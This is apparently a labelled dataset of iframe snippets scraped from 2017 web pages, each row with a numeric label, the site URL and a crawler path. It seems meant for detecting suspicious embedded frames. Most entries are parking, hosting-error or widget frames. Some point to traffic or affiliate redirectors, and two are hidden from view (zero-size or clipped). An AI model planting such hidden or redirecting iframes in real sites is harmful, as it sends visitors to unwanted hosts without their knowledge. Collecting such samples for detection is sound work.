0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/MzqvMJjgrUMaMv5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://story-kits.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_5924_20170726_182323/html_200_20170726_182323.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pzMlp2qlpUHhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",https://eseftech.com/,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_4718_20170726_185433/html_200_20170726_185433.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/L25yqz51M3IlrzWcqaVhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://pariahthemovie.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_4448_20170726_192544/html_200_20170726_192544.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pUIyqzMaLzMyLzSaLzLhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://christosrontos.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_2557_20170726_180004/html_200_20170726_180004.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/rzkzL3Wjqz55qz0hpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://myspecializ.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_1975_20170726_192142/html_200_20170726_192142.txt
0,"<iframe frameborder=""0"" height=""100%"" marginwidth=""0"" scrolling=""auto"" src=""http://fwdssp.com/?dn=referer_detect&amp;pid=5POL4F2O4"" width=""100%""></iframe>",http://babybabilo.com/cgi-sys/suspendedpage.cgi,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_2559_20170726_183856/html_200_20170726_183856.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/ozW5MaWupF5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://aolsend.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_9758_20170726_175641/html_200_20170726_175641.txt
0,"<iframe height=""100%"" src=""https://www.nuxhotel.biz"" width=""100%""><a href=""https://www.nuxhotel.biz"">https://www.nuxhotel.biz</a></iframe>",http://habgo.biz,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_1818_20170726_190205/html_200_20170726_190205.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/qUWaMzAlpUMhrKMgYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://getspecializ.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_7638_20170726_185959/html_200_20170726_185959.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/oay5pzMwLzIaMv5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://allesports.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_9633_20170726_183435/html_200_20170726_183435.txt
0,"<iframe frameborder=""0"" height=""600"" scrolling=""no"" src=""https://soundgine.com/@ibsenproducer/euplayer/pod/mobile/index.php?id=2"" style=""border:none"" width=""100%""></iframe>",https://liisvoice.com/,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_9242_20170726_191520/html_200_20170726_191520.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/naWiM3WzM3MjYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://webtestic.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_3790_20170726_182805/html_200_20170726_182805.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/rzklrKSlMJ5knKMgLzHhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://myelderadvizor.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_3765_20170726_192111/html_200_20170726_192111.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/rzI2qUEzYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://mriggs.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_549_20170726_192027/html_200_20170726_192027.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/LKIhLJglMl52LKAv"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://nhanxet.info,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_6688_20170726_192307/html_200_20170726_192307.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pT5zoaShMzAyqachMv5upzp="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://casadasprimas.net,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_1744_20170726_175925/html_200_20170726_175925.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/qUWapaykpzIhpJy2MzWyYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://getelderadvisor.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_6209_20170726_185957/html_200_20170726_185957.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/rzklrKSlMJManUAmYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://myelderstuff.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_8613_20170726_192111/html_200_20170726_192111.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/rTWvo3OvLJqyLaxhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://koobcontrol.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_2351_20170726_191358/html_200_20170726_191358.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/LzSaraMupzHhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://ontminer.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_8960_20170726_181706/html_200_20170726_181706.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pJ52rJkkpzI6qzLhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://dailydermis.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_696_20170726_184842/html_200_20170726_184842.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/qTWhM2M2M3VhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://goatsite.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_7918_20170726_190044/html_200_20170726_190044.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/o2W2M3WzozSapv5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://boitesante.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_8888_20170726_184227/html_200_20170726_184227.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/MJWzpTWlL3IfMaMvYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://roscoephysio.com,/mnt/ke_scrapy_data_22_bot3/2/Win7_32_IE8_2_3065_20170726_182100/html_200_20170726_182100.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://evro-partner.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1347_20170729_083745/html_200_20170729_083745.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://krpa.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_7522_20170729_033627/html_200_20170729_033627.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://dobrava.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8441_20170729_111824/html_200_20170729_111824.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://vallox.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_9279_20170729_071712/html_200_20170729_071712.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://internet-casino.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_6386_20170729_085811/html_200_20170729_085811.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://glesox.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_6876_20170729_020408/html_200_20170729_020408.txt
0,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://land-design.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_6482_20170729_063720/html_200_20170729_063720.txt
0,"<iframe frameborder=""0"" height=""100"" src=""https://music.yandex.ru/iframe/#track/10770737/1169451/"" style=""border: none; width: 600px; height: 100px;"" width=""600"">_ <a href=""https://music.yandex.ru/album/1169451/track/10770737"">From Roots to Needles</a>  <a href=""https://music.yandex.ru/artist/1699763"">If These Trees Could Talk</a> _ __._</iframe>",http://read-me.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5440_20170729_033840/html_200_20170729_033840.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://sbig.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1127_20170729_023514/html_200_20170729_023514.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://land.lptracker.ru/?ref=28365&amp;ip=209.249.157.102user_agent=Mozilla%2F5.0+%28compatible%3B+MSIE+8.0%3B+Windows+NT+6.1%3B+Trident%2F4.0%3B+GTB7.4%3B+InfoPath.2%3B+SV1%3B+.NET+CLR+3.3.69573%3B+WOW64%3B+en-US%29&amp;utm_source=&amp;utm_campaign=&amp;utm_term=&amp;utm_content=&amp;referer="" style=""padding:0px; margin:0px;"" width=""100%""></iframe>",http://call-tracking.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_4158_20170729_105939/html_200_20170729_105939.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://vodoleytula.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_6067_20170729_070446/html_200_20170729_070446.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://overlive.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2231_20170729_015655/html_200_20170729_015655.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/new/"" width=""100%""></iframe>",http://smaga.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5029_20170729_014527/html_200_20170729_014527.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/locked/"" width=""100%""></iframe>",http://procrastination.su/cgi-sys/suspendedpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1479_20170729_053311/html_200_20170729_053311.txt
1,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://severia.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8607_20170729_075324/html_200_20170729_075324.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-khabarovsk.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_7498_20170729_013948/html_200_20170729_013948.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-ivanovo.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2538_20170729_032412/html_200_20170729_032412.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://xn----7sbghedaxvekfjjba8ajdu0c.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_170_20170729_025717/html_200_20170729_025717.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://sdiv.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2665_20170729_010156/html_200_20170729_010156.txt
0,"<iframe allowtransparency=""true"" frameborder=""no"" height=""22"" scrolling=""no"" src=""http://monitoringminecraft.ru/status-iframe2n/178.33.43.45%3A25565.png#%5B1.8%20-%201.12%5D%20IP%3A%20mc.FunnyCraft.su%20%D0%BE%D0%BD%D0%BB%D0%B0%D0%B9%D0%BD%20"" width=""480""></iframe>",http://funnycraft.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_853_20170729_070741/html_200_20170729_070741.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1927_20170729_085142/html_200_20170729_085142.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/new/"" width=""100%""></iframe>",http://belova.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_3419_20170729_110343/html_200_20170729_110343.txt
0,"<iframe src=""http://www.domains4sale.ru/cgi-bin/ab.cgi?russianhome.su""></iframe>",http://russianhome.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_9054_20170729_082951/html_200_20170729_082951.txt
0,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",https://diez.su/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_3637_20170729_094850/html_200_20170729_094850.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://verniikonu.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_6997_20170729_101052/html_200_20170729_101052.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://goodlook.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_477_20170729_104356/html_200_20170729_104356.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/locked/"" width=""100%""></iframe>",http://tserv.su/cgi-sys/suspendedpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_9549_20170729_043755/html_200_20170729_043755.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://newpost.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_4170_20170729_013350/html_200_20170729_013350.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_4531_20170729_103530/html_200_20170729_103530.txt
0,"<iframe height=""0"" src=""http://www.advantshop.net/appoffline.aspx"" style=""border:none"" width=""0""></iframe>",http://thermobile.su/app_offline.html,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_6945_20170729_120820/html_200_20170729_120820.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://gadalki.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_4288_20170729_124104/html_200_20170729_124104.txt
0,"<iframe src=""http://www.domains4sale.ru/cgi-bin/ab.cgi?cities.su""></iframe>",http://cities.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8341_20170729_125656/html_200_20170729_125656.txt
0,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://richwell.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_4243_20170729_130504/html_200_20170729_130504.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2092_20170729_071151/html_200_20170729_071151.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-astrakhan.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8542_20170729_022927/html_200_20170729_022927.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/new/"" width=""100%""></iframe>",http://kcs.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8031_20170729_132519/html_200_20170729_132519.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://cybershop.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_7452_20170729_064305/html_200_20170729_064306.txt
0,"<iframe src=""http://promodj.com/list"" style=""border: 0; width: 100%; height: 100%""><a href=""http://promodj.com/list"">__ ___</a></iframe>",http://djlist.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_7109_20170729_053044/html_200_20170729_053044.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://trafindex.ru/aud/1488/x196"" width=""100%"">			  _ ___ iFrame		</iframe>",http://p-parks.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_9776_20170729_052455/html_200_20170729_052455.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://xn--80ahc.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1707_20170729_042735/html_200_20170729_042735.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8621_20170729_081531/html_200_20170729_081531.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=nespresso.su&amp;pid=9PO755G95""></iframe>",http://nespresso.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2807_20170729_060233/html_200_20170729_060233.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-primorsky.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_6455_20170729_054145/html_200_20170729_054145.txt
0,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://cpg.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1281_20170729_060715/html_200_20170729_060715.txt
0,"<iframe src=""http://www.domains4sale.ru/cgi-bin/ab.cgi?motel.su""></iframe>",http://motel.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5247_20170729_032553/html_200_20170729_032553.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-vladimir.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_4922_20170729_113020/html_200_20170729_113020.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://hatsan.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_7402_20170729_073612/html_200_20170729_073612.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://kstar.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5822_20170729_115428/html_200_20170729_115428.txt
0,"<iframe async="""" frameborder=""0"" height=""50px"" horizontalscrolling=""no"" scrolling=""no"" src=""https://tgwidget.com/widget/count/?id=5907a5f183ba8884028b4567"" verticalscrolling=""no"" width=""160px""></iframe>",http://smithy.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5326_20170729_110908/html_200_20170729_110908.txt
0,"<iframe src=""http://www.domains4sale.ru/cgi-bin/ab.cgi?nation.su""></iframe>",http://nation.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_572_20170729_065443/html_200_20170729_065443.txt
0,"<iframe src=""http://www.domains4sale.ru/cgi-bin/ab.cgi?publisher.su""></iframe>",http://publisher.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2551_20170729_035905/html_200_20170729_035905.txt
0,"<iframe src=""http://milbiz-clab.ru/79vJgw2""></iframe>",http://babysafelock.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_7011_20170729_013349/html_200_20170729_013349.txt
3,"<iframe class=""wp-embedded-content"" data-secret=""m9aqqAFlFi"" frameborder=""0"" height=""338"" marginheight=""0"" marginwidth=""0"" sandbox=""allow-scripts"" scrolling=""no"" security=""restricted"" src=""http://gmpnews.ru/2016/12/na-baze-bioximika-sozdaetsya-centr-po-razrabotke-novyx-vidov-antibiotikov/embed/#?secret=m9aqqAFlFi"" style=""position: absolute; clip: rect(1px, 1px, 1px, 1px);"" title=""  ___ _ _ _ __ ___ ___ _____  ___ GMP.  _ ____  ____ __ __"" width=""600""></iframe>",http://antibiotics.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_4754_20170729_024418/html_200_20170729_024418.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-kaluga.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_6099_20170729_092802/html_200_20170729_092802.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://nomer8.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_6776_20170729_044657/html_200_20170729_044657.txt
1,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://electrocube.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5712_20170729_055742/html_200_20170729_055742.txt
0,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://ur-konsult.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_22_20170729_094229/html_200_20170729_094229.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://egeist.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1096_20170729_080410/html_200_20170729_080410.txt
0,"<iframe src=""http://www.domains4sale.ru/cgi-bin/ab.cgi?visitor.su""></iframe>",http://visitor.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8318_20170729_093005/html_200_20170729_093005.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://clgr.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_9829_20170729_014220/html_200_20170729_014220.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-novokuznetsk.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2205_20170729_060407/html_200_20170729_060407.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-primorskiy.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1367_20170729_015839/html_200_20170729_015839.txt
0,"<iframe height=""200"" src=""http://www.itm-katalog.ru/Informer/conv_ero.php?ind=eur"" width=""600""> </iframe>",http://tripit.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8261_20170729_024616/html_200_20170729_024616.txt
0,"<iframe src=""http://www.domains4sale.ru/cgi-bin/ab.cgi?saudi-arabia.su""></iframe>",http://saudi-arabia.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8087_20170729_070733/html_200_20170729_070733.txt
0,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://service-apple.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5457_20170729_025620/html_200_20170729_025620.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://c-market.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8268_20170729_104148/html_200_20170729_104148.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://putpay.org/site/38132649s866289p1385"" width=""100%""></iframe>",http://yoursenderpro.ru/aff/,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_2722_20170729_043922/html_200_20170729_043922.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-habarovsk.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_1344_20170729_093223/html_200_20170729_093223.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://land.lptracker.ru/?ref=13368&amp;ip=209.249.157.102user_agent=Mozilla%2F5.0+%28compatible%3B+MSIE+8.0%3B+Windows+NT+6.1%3B+Trident%2F4.0%3B+GTB7.4%3B+InfoPath.2%3B+SV1%3B+.NET+CLR+3.3.69573%3B+WOW64%3B+en-US%29&amp;utm_source=&amp;utm_campaign=&amp;utm_term=&amp;utm_content=&amp;referer="" style=""padding:0px; margin:0px;"" width=""100%""></iframe>",http://crmlptracker.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5482_20170729_114105/html_200_20170729_114105.txt
0,"<iframe frameborder=""0"" height=""100%"" src=""http://err.hc.ru/missing/"" width=""100%""></iframe>",http://audi-cherepovets.su/cgi-sys/defaultwebpage.cgi,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_8485_20170729_072340/html_200_20170729_072340.txt
0,"<iframe frameborder=""0"" height=""100%"" scrolling=""yes"" src=""http://vip-zzakazz.ru/shop-sale/?ref=4916&amp;lnk=1375583"" width=""100%""></iframe>",http://wowshop.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_3342_20170729_095245/html_200_20170729_095245.txt
0,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://malamut.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_3780_20170729_133032/html_200_20170729_133032.txt
0,"<iframe id=""freemiumBanner"" src=""https://ukit.com/html/freemium/ru.html""></iframe>",http://zimnitsa.su,/mnt/ke_scrapy_data_22_bot3/12/Win7_32_IE8_12_5818_20170729_100302/html_200_20170729_100302.txt
